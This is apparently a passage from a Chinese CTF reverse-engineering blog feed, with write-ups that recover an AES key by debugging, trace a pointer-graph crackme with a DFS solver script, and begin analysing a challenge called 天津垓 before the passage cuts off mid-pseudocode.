class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_40221A</span><span class="params">(__int64 a1)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v2; <span class="comment">// [rsp+18h] [rbp-D8h]</span></span><br><span class="line">  <span class="keyword">int</span> i; <span class="comment">// [rsp+1Ch] [rbp-D4h]</span></span><br><span class="line">  <span class="keyword">char</span> v4[<span class="number">200</span>]; <span class="comment">// [rsp+20h] [rbp-D0h] BYREF</span></span><br><span class="line">  <span class="keyword">unsigned</span> __int64 v5; <span class="comment">// [rsp+E8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  sub_400A71((__int64)v4, (__int64)&amp;unk_603170);<span class="comment">// 经典密钥生成</span></span><br><span class="line">  sub_40196E((__int64)v4, a1);                  <span class="comment">// 这tm是AES</span></span><br><span class="line">  sub_40196E((__int64)v4, a1 + <span class="number">16</span>);</span><br><span class="line">  v2 = <span class="number">1</span>;</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">31</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( *(_BYTE *)(i + a1) != byte_6030A0[i] )</span><br><span class="line">      v2 = <span class="number">0</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> v2;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>最后的 <code>byte_6030A0</code> 显然是加密结果的校验了</p><p>上面有两个函数 <code>sub_400A71</code> 和 <code>sub_40196E</code>，<code>400A71</code> 调用了之前出现的 <code>603170</code> 猜测是一个密钥，<code>40196E</code> 使用了两次，且分别是对输入的前一半与后一半的操作，猜测是加密函数。密钥生成和输入无关，完全可以通过动态调试得到结果，所以查看加密函数。</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">__int64 __fastcall <span class="title">sub_401828</span><span class="params">(__int64 a1, __int64 a2)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> __int8 i; <span class="comment">// [rsp+1Fh] [rbp-1h]</span></span><br><span class="line"></span><br><span class="line">  sub_400B0A(<span class="number">0L</span>L, a1, a2);                      <span class="comment">// 这是aes哦</span></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">1</span>; i &lt;= <span class="number">9u</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    sub_400BAC(a1);</span><br><span class="line">    sub_400C1F(a1);</span><br><span class="line">    sub_400D27(a1);</span><br><span class="line">    sub_400B0A(i, a1, a2);</span><br><span class="line">  &#125;</span><br><span class="line">  sub_400BAC(a1);</span><br><span class="line">  sub_400C1F(a1);</span><br><span class="line">  <span class="keyword">return</span> sub_400B0A(<span class="number">10L</span>L, a1, a2);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>一开始被各个函数吓一跳，但点到某个函数里发现好像是 $4\times 4$ 的一个方阵，又发现某些函数重复出现的规则和 AES 很像，于是推测这个是 AES 加密算法，稍微看了下具体的函数实现，应该没有大问题，于是着手解密了。</p><h1 id="解密"><a href="#解密" class="headerlink" title="解密"></a>解密</h1><p>首先动态调试拿到密钥</p><p>直接步过这句代码： <code>sub_40207B((__int64)&amp;unk_603170);</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">gdb-peda$</span><span class="bash"> b *0x4021e4</span></span><br><span class="line">Breakpoint 2 at 0x4021e4</span><br><span class="line"><span class="meta">gdb-peda$</span><span class="bash"> c</span></span><br><span class="line"><span class="meta">gdb-peda$</span><span class="bash"> n</span></span><br><span class="line"><span class="meta">gdb-peda$</span><span class="bash"> x/50x 0x603170</span></span><br><span class="line">0x603170:       0xcb    0x8d    0x49    0x35    0x21    0xb4    0x7a    0x4c</span><br><span class="line">0x603178:       0xc1    0xae    0x7e    0x62    0x22    0x92    0x66    0xce</span><br><span class="line">0x603180:       0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00</span><br></pre></td></tr></table></figure><p>拿到密钥</p><p>随后直接到 ida 相应地址中取出密文</p><p>用之前写过的 AES 脚本解密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> my_aes</span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> n2s</span><br><span class="line"></span><br><span class="line">key     = <span class="number">0xcb8d493521b47a4cc1ae7e62229266ce</span></span><br><span class="line">cipher1 = <span class="number">0xBC0AADC0147C5ECCE0B140BC9C51D52B</span></span><br><span class="line">cipher2 = <span class="number">0x46B2B9434DE5324BAD7FB4B39CDB4B5B</span></span><br><span class="line"></span><br><span class="line">print(n2s(my_aes.aes_encrypt(cipher1, key)), end = <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">print(n2s(my_aes.aes_encrypt(cipher2, key)))</span><br></pre></td></tr></table></figure><p>输出如下：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">b&#x27;flag&#123;924a9ab2163&#x27;</span><span class="string">b&#x27;d390410d0a1f670&#125;&#x27;</span></span><br></pre></td></tr></table></figure><p>得到 flag</p>]]></content>
    
    
    <summary type="html">&lt;p&gt;前言：&lt;/p&gt;
&lt;p&gt;下午在上课的时候写了个 AES 加密，晚上正好遇到，立马认出来了，于是赶紧把解密部分写完，用自己的代码跑出来了，爽到。&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://s0uthwood.github.io/categories/CTF/"/>
    
    <category term="Reverse" scheme="https://s0uthwood.github.io/categories/CTF/Reverse/"/>
    
    
    <category term="CTF" scheme="https://s0uthwood.github.io/tags/CTF/"/>
    
    <category term="Reverse" scheme="https://s0uthwood.github.io/tags/Reverse/"/>
    
    <category term="BUUOJ" scheme="https://s0uthwood.github.io/tags/BUUOJ/"/>
    
  </entry>
  
  <entry>
    <title>高校战役 re writeups</title>
    <link href="https://s0uthwood.github.io/2021/03/31/%E9%AB%98%E6%A0%A1%E6%88%98%E5%BD%B9-re-%E5%89%8D%E5%9B%9B%E9%A2%98-writeups/"/>
    <id>https://s0uthwood.github.io/2021/03/31/%E9%AB%98%E6%A0%A1%E6%88%98%E5%BD%B9-re-%E5%89%8D%E5%9B%9B%E9%A2%98-writeups/</id>
    <published>2021-03-31T12:33:02.000Z</published>
    <updated>2021-05-29T19:43:14.664Z</updated>
    
    <content type="html"><![CDATA[<p>完成：cycle graph, 天津垓, fxck, easyparser</p><p>被学长安利的比赛</p><a id="more"></a><h1 id="cycle-graph"><a href="#cycle-graph" class="headerlink" title="cycle graph"></a>cycle graph</h1><h2 id="逆向代码"><a href="#逆向代码" class="headerlink" title="逆向代码"></a>逆向代码</h2><p>根据提示，这是一道纯算法题，拖到 ida 中，根据关键字符串定位到关键函数。查看核心代码</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">dword_403370 = <span class="number">0</span>;</span><br><span class="line">v1 = &amp;unk_403384;</span><br><span class="line">byte_403374 = <span class="number">48</span>;</span><br><span class="line">v2 = <span class="number">0</span>;</span><br><span class="line">dword_403378 = (<span class="keyword">int</span>)&amp;unk_403380;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">  v3 = dword_402178[v2];</span><br><span class="line">  ++v2;</span><br><span class="line">  *(v1 - <span class="number">1</span>) = v3;</span><br><span class="line">  *v1 = (<span class="keyword">char</span> *)&amp;unk_403380 + <span class="number">12</span> * dword_402274[v2];</span><br><span class="line">  v1[<span class="number">1</span>] = (<span class="keyword">char</span> *)&amp;unk_403380 + <span class="number">12</span> * dword_4021F4[v2];</span><br><span class="line">  v1 += <span class="number">3</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> ( (<span class="keyword">signed</span> <span class="keyword">int</span>)v1 &lt; (<span class="keyword">signed</span> <span class="keyword">int</span>)&amp;unk_403504 );</span><br></pre></td></tr></table></figure><p>上面的代码是主函数开头的初始化部分</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line">sub_401020(<span class="string">&quot;You need a flag to get out of this:\n&quot;</span>, a1);</span><br><span class="line">scan(<span class="string">&quot;%s&quot;</span>, &amp;input);</span><br><span class="line">v4 = dword_403370;                            <span class="comment">// 0</span></span><br><span class="line">v5 = byte_403374;                             <span class="comment">// 48</span></span><br><span class="line">v6 = <span class="number">5</span>;</span><br><span class="line">v7 = dword_403378;</span><br><span class="line"><span class="keyword">do</span></span><br><span class="line">&#123;</span><br><span class="line">  v11 = *(&amp;input + v6);</span><br><span class="line">  <span class="keyword">if</span> ( *(_DWORD *)v7 + v5 == v11 )</span><br><span class="line">  &#123;</span><br><span class="line">    v7 = *(_DWORD *)(v7 + <span class="number">4</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( v5 - *(_DWORD *)v7 != v11 )</span><br><span class="line">    &#123;</span><br><span class="line">      sub_401020(<span class="string">&quot;This is not flag~\n&quot;</span>, v10);</span><br><span class="line">      system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    v7 = *(_DWORD *)(v7 + <span class="number">8</span>);</span><br><span class="line">  &#125;</span><br><span class="line">  v5 = *(&amp;input + v6);</span><br><span class="line">  ++v4;</span><br><span class="line">  ++v6;</span><br><span class="line">  byte_403374 = v5;</span><br><span class="line">  dword_403378 = v7;</span><br><span class="line">  dword_403370 = v4;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span> ( v6 &lt; <span class="number">21</span> );</span><br></pre></td></tr></table></figure><p>上面的代码是根据输入进行的一系列操作</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( input != <span class="string">&#x27;f&#x27;</span> || v13 != <span class="string">&#x27;l&#x27;</span> || v14 != <span class="string">&#x27;a&#x27;</span> || v15 != <span class="string">&#x27;g&#x27;</span> || v16 != <span class="string">&#x27;&#123;&#x27;</span> || v17 != <span class="string">&#x27;&#125;&#x27;</span> )</span><br><span class="line">&#123;</span><br><span class="line">  v8 = <span class="string">&quot;illegal input~\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( v4 &gt; <span class="number">16</span> || (_UNKNOWN *)v7 != &amp;unk_4034F4 )</span><br><span class="line">&#123;</span><br><span class="line">  v8 = <span class="string">&quot;This is not flag~\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  v8 = <span class="string">&quot;Congratulations!!\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line">sub_401020(v8, v11);</span><br><span class="line">system(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"><span class="keyword">return</span> <span class="number">0</span>;</span><br></pre></td></tr></table></figure><p>上面的代码就是最后的验证环节</p><p>一开始尝试直接看代码，发现自己被绕进去了，完全不知道各个地址是什么东西，所以考虑通过动态调试来得到初始化后的结果</p><h2 id="动态调试"><a href="#动态调试" class="headerlink" title="动态调试"></a>动态调试</h2><p>直接拖到 x32dbg 中，在第一个输出的字符串前面打上断点，然后运行到断点的位置</p><p>分析了一下初始化部分，认为关键的内存部分应该是从 <code>403370</code> 开始一直到 <code>403540</code> 这部分</p><p>于是找到 <code>3370</code> ，右键选择内存窗口找到地址</p><p>鉴于数据量不大，直接手dump下来就行了</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line">00C43370  00 00 00 00 30 00 00 00 80 33 C4 00 00 00 00 00  ....0....3Ä.....  </span><br><span class="line">00C43380  34 00 00 00 98 33 C4 00 8C 33 C4 00 02 00 00 00  4....3Ä..3Ä.....  </span><br><span class="line">00C43390  98 33 C4 00 E0 33 C4 00 2C 00 00 00 8C 33 C4 00  .3Ä.à3Ä.,....3Ä.  </span><br><span class="line">00C433A0  D4 33 C4 00 2A 00 00 00 58 34 C4 00 94 34 C4 00  Ô3Ä.*...X4Ä..4Ä.  </span><br><span class="line">00C433B0  06 00 00 00 D4 33 C4 00 EC 33 C4 00 2A 00 00 00  ....Ô3Ä.ì3Ä.*...  </span><br><span class="line">00C433C0  98 33 C4 00 64 34 C4 00 2F 00 00 00 B8 34 C4 00  .3Ä.d4Ä.&#x2F;...¸4Ä.  </span><br><span class="line">00C433D0  F4 34 C4 00 2A 00 00 00 1C 34 C4 00 94 34 C4 00  ô4Ä.*....4Ä..4Ä.  </span><br><span class="line">00C433E0  33 00 00 00 B0 33 C4 00 EC 33 C4 00 03 00 00 00  3...°3Ä.ì3Ä.....  </span><br><span class="line">00C433F0  F8 33 C4 00 1C 34 C4 00 02 00 00 00 B0 33 C4 00  ø3Ä..4Ä.....°3Ä.  </span><br><span class="line">00C43400  10 34 C4 00 32 00 00 00 7C 34 C4 00 DC 34 C4 00  .4Ä.2...|4Ä.Ü4Ä.  </span><br><span class="line">00C43410  32 00 00 00 28 34 C4 00 F8 33 C4 00 32 00 00 00  2...(4Ä.ø3Ä.2...  </span><br><span class="line">00C43420  8C 33 C4 00 A0 34 C4 00 30 00 00 00 80 33 C4 00  .3Ä. 4Ä.0....3Ä.  </span><br><span class="line">00C43430  EC 33 C4 00 03 00 00 00 28 34 C4 00 A0 34 C4 00  ì3Ä.....(4Ä. 4Ä.  </span><br><span class="line">00C43440  01 00 00 00 BC 33 C4 00 AC 34 C4 00 32 00 00 00  ....¼3Ä.¬4Ä.2...  </span><br><span class="line">00C43450  D4 33 C4 00 EC 33 C4 00 2B 00 00 00 D0 34 C4 00  Ô3Ä.ì3Ä.+...Ð4Ä.  </span><br><span class="line">00C43460  B8 34 C4 00 02 00 00 00 10 34 C4 00 A4 33 C4 00  ¸4Ä......4Ä.¤3Ä.  </span><br><span class="line">00C43470  2E 00 00 00 D0 34 C4 00 88 34 C4 00 01 00 00 00  ....Ð4Ä..4Ä.....  </span><br><span class="line">00C43480  34 34 C4 00 C8 33 C4 00 02 00 00 00 34 34 C4 00  44Ä.È3Ä.....44Ä.  </span><br><span class="line">00C43490  4C 34 C4 00 2D 00 00 00 98 33 C4 00 1C 34 C4 00  L4Ä.-....3Ä..4Ä.  </span><br><span class="line">00C434A0  32 00 00 00 40 34 C4 00 D4 33 C4 00 04 00 00 00  2...@4Ä.Ô3Ä.....  </span><br><span class="line">00C434B0  94 34 C4 00 34 34 C4 00 2D 00 00 00 E8 34 C4 00  .4Ä.44Ä.-...è4Ä.  </span><br><span class="line">00C434C0  70 34 C4 00 30 00 00 00 94 34 C4 00 8C 33 C4 00  p4Ä.0....4Ä..3Ä.  </span><br><span class="line">00C434D0  31 00 00 00 64 34 C4 00 40 34 C4 00 2F 00 00 00  1...d4Ä.@4Ä.&#x2F;...  </span><br><span class="line">00C434E0  EC 33 C4 00 B0 33 C4 00 33 00 00 00 88 34 C4 00  ì3Ä.°3Ä.3....4Ä.  </span><br><span class="line">00C434F0  04 34 C4 00 05 00 00 00 F4 34 C4 00 F4 34 C4 00  .4Ä.....ô4Ä.ô4Ä.  </span><br><span class="line">00C43500  02 00 00 00 00 00 00 00 04 00 00 00 00 00 00 00  ................  </span><br></pre></td></tr></table></figure><p>然后对照着第二部分的代码一点一点看，发现其实就是如果 <code>*(_DWORD *)v7 + v5 == v11</code> 就让 <code>v7</code> 跳到下一个内存地址所指向的地址（这题指针有点绕），比如一开始如果满足输入为 <code>0x34+0x30</code> 接下来就先走到 <code>C43384</code> ，然后从这里跳到 <code>C43398</code> 这个地址，继续下一步运算，如果 <code>v5 - *(_DWORD *)v7 != v11</code> 就走到下两个内存地址所指向的地址。</p><h2 id="脚本求解"><a href="#脚本求解" class="headerlink" title="脚本求解"></a>脚本求解</h2><p>原理就是根据地址跳一次，那么接下来就是求解了，由于每一步都有两种可能（实际上并不是，要在可见字符有范围的）</p><p>一开始觉得可能只有一种路径，直接用循环求解了，结果不行，就写了个dfs</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line">addr = [</span><br><span class="line">    <span class="number">0x000034</span>,        <span class="number">6</span>,        <span class="number">3</span>, <span class="number">0x000002</span>,</span><br><span class="line">           <span class="number">6</span>, <span class="number">0xC433E0</span>, <span class="number">0x00002C</span>,        <span class="number">3</span>,</span><br><span class="line">    <span class="number">0xC433D4</span>, <span class="number">0x00002A</span>, <span class="number">0xC43458</span>, <span class="number">0xC43494</span>,</span><br><span class="line">    <span class="number">0x000006</span>, <span class="number">0xC433D4</span>, <span class="number">0xC433EC</span>, <span class="number">0x00002A</span>,</span><br><span class="line">           <span class="number">6</span>, <span class="number">0xC43464</span>, <span class="number">0x00002F</span>, <span class="number">0xC434B8</span>,</span><br><span class="line">    <span class="number">0xC434F4</span>, <span class="number">0x00002A</span>, <span class="number">0xC4341C</span>, <span class="number">0xC43494</span>,</span><br><span class="line">    <span class="number">0x000033</span>,       <span class="number">12</span>, <span class="number">0xC433EC</span>, <span class="number">0x000003</span>,</span><br><span class="line">    <span class="number">0xC433F8</span>, <span class="number">0xC4341C</span>, <span class="number">0x000002</span>,       <span class="number">12</span>,</span><br><span class="line">    <span class="number">0xC43410</span>, <span class="number">0x000032</span>, <span class="number">0xC4347C</span>, <span class="number">0xC434DC</span>,</span><br><span class="line">    <span class="number">0x000032</span>, <span class="number">0xC43428</span>, <span class="number">0xC433F8</span>, <span class="number">0x000032</span>,</span><br><span class="line">           <span class="number">3</span>, <span class="number">0xC434A0</span>, <span class="number">0x000030</span>,        <span class="number">0</span>,</span><br><span class="line">    <span class="number">0xC433EC</span>, <span class="number">0x000003</span>, <span class="number">0xC43428</span>, <span class="number">0xC434A0</span>,</span><br><span class="line">    <span class="number">0x000001</span>,       <span class="number">15</span>, <span class="number">0xC434AC</span>, <span class="number">0x000032</span>,</span><br><span class="line">    <span class="number">0xC433D4</span>, <span class="number">0xC433EC</span>, <span class="number">0x00002B</span>, <span class="number">0xC434D0</span>,</span><br><span class="line">    <span class="number">0xC434B8</span>, <span class="number">0x000002</span>, <span class="number">0xC43410</span>,        <span class="number">9</span>,</span><br><span class="line">    <span class="number">0x00002E</span>, <span class="number">0xC434D0</span>, <span class="number">0xC43488</span>, <span class="number">0x000001</span>,</span><br><span class="line">    <span class="number">0xC43434</span>, <span class="number">0xC433C8</span>, <span class="number">0x000002</span>, <span class="number">0xC43434</span>,</span><br><span class="line">    <span class="number">0xC4344C</span>, <span class="number">0x00002D</span>,        <span class="number">6</span>, <span class="number">0xC4341C</span>,</span><br><span class="line">    <span class="number">0x000032</span>, <span class="number">0xC43440</span>, <span class="number">0xC433D4</span>, <span class="number">0x000004</span>,</span><br><span class="line">    <span class="number">0xC43494</span>, <span class="number">0xC43434</span>, <span class="number">0x00002D</span>, <span class="number">0xC434E8</span>,</span><br><span class="line">    <span class="number">0xC43470</span>, <span class="number">0x000030</span>, <span class="number">0xC43494</span>,        <span class="number">3</span>,</span><br><span class="line">    <span class="number">0x000031</span>, <span class="number">0xC43464</span>, <span class="number">0xC43440</span>, <span class="number">0x00002F</span>,</span><br><span class="line">    <span class="number">0xC433EC</span>,       <span class="number">12</span>, <span class="number">0x000033</span>, <span class="number">0xC43488</span>,</span><br><span class="line">    <span class="number">0xC43404</span>, <span class="number">0x000005</span>, <span class="number">0xC434F4</span>, <span class="number">0xC434F4</span>,</span><br><span class="line">]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(addr)):</span><br><span class="line">    <span class="keyword">if</span> addr[i] &gt;= <span class="number">0xc43380</span>:</span><br><span class="line">        addr[i] -= <span class="number">0xc43380</span></span><br><span class="line">        addr[i] //= <span class="number">4</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">dfs</span>(<span class="params">start, add, count</span>):</span></span><br><span class="line">    <span class="keyword">if</span> (add &gt; <span class="number">0x7e</span>) <span class="keyword">or</span> add &lt; <span class="number">0x21</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> (count &gt;= <span class="number">21</span>) <span class="keyword">and</span> (start == <span class="number">93</span>):</span><br><span class="line">        <span class="built_in">print</span> (<span class="built_in">chr</span>(add), end = <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">elif</span> (count &gt;= <span class="number">21</span>) <span class="keyword">and</span> start != <span class="number">93</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> dfs(addr[start + <span class="number">1</span>], add + addr[start], count + <span class="number">1</span>):</span><br><span class="line">        <span class="built_in">print</span> (<span class="built_in">chr</span>(add), end = <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">if</span> dfs(addr[start + <span class="number">2</span>], add - addr[start], count + <span class="number">1</span>):</span><br><span class="line">        <span class="built_in">print</span> (<span class="built_in">chr</span>(add), end = <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">dfs(<span class="number">0</span>, <span class="number">0x30</span>, <span class="number">5</span>)</span><br><span class="line"><span class="comment"># 72ab0c6a79cb0b8d0</span></span><br></pre></td></tr></table></figure><p>这个是倒序输出，且有个 <code>0</code> 是最初的 <code>0x30</code></p><p>最后反转过来就行了</p><p>（因为 adworld 不会提交，也不知道对不对，反正运行结果是 <code>Congratulations!!</code> 了）</p><h1 id="天津垓"><a href="#天津垓" class="headerlink" title="天津垓"></a>天津垓</h1><h2 id="反反调试"><a href="#反反调试" class="headerlink" title="反反调试"></a>反反调试</h2><h2 id="破解-Authorize"><a href="#破解-Authorize" class="headerlink" title="破解 Authorize"></a>破解 Authorize</h2><p>运行 exe 文件，看到 <code>Authorize:</code> 字符串，到 ida 中通过 <code>Shift+F12</code> 找到字符串的位置，通过交叉引用找到关键函数。</p><p>查看函数伪代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">sub_1004011F6</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  v39 = &#x27;H_gnisiR&#x27;;</span><br><span class="line">  v40 = &#x27;eppo&#x27;;</span><br><span class="line">  v41 = &#x27;!r&#x27;;</span><br><span class="line">  v42 = <span class="number">0</span>;</span><br><span class="line">  v31 = &#x27;eht nehW&#x27;;</span><br><span class="line">  v32 = &#x27;oh evif &#x27;;</span><br><span class="line">  v33 = &#x27;sorc snr&#x27;;</span><br><span class="line">  v34 = &#x27;g eht ,s&#x27;;</span><br><span class="line">  v35 = &#x27;os nedlo&#x27;;</span><br><span class="line">  v36 = &#x27;HT reidl&#x27;;</span><br><span class="line">  v37 = &#x27;si RESUO&#x27;;</span><br><span class="line">  v38 = &#x27;\n.nrob &#x27;;</span><br><span class="line">  v25 = &#x27;t pmuj A&#x27;;</span><br><span class="line">  v26 = &#x27;ks eht o&#x27;;</span><br><span class="line">  v27 = &#x27; snrut y&#x27;;</span><br><span class="line">  v28 = &#x27;dir a ot&#x27;;</span><br><span class="line">  v29 = &#x27;.kcik re&#x27;;</span><br><span class="line">  v30 = <span class="string">&#x27;\n&#x27;</span>;</span><br><span class="line">  v21 = &#x27;etneserP&#x27;;</span><br><span class="line">  v22 = &#x27;IAZ yb d&#x27;;</span><br><span class="line">  v23 = &#x27;\nA&#x27;;</span><br><span class="line">  v24 = <span class="number">0</span>;</span><br><span 